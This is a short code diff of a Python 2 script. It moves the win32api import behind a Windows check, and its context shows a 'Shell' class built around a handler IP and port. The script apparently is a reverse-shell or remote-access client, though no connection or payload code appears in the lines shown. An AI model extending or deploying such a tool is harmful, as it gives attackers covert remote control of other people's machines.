@@ -1,5 +1,10 @@
 #!/usr/bin/env python2
-import socket, subprocess, os, threading, json, base64, win32api, datetime, getpass, time
+import socket, subprocess, os, threading, json, base64, datetime, getpass, time
+
+if os.name == 'nt':
+    import win32api
+else:
+    pass
 
 class Shell:
 	def __init__(self, handler_ip, handler_port):
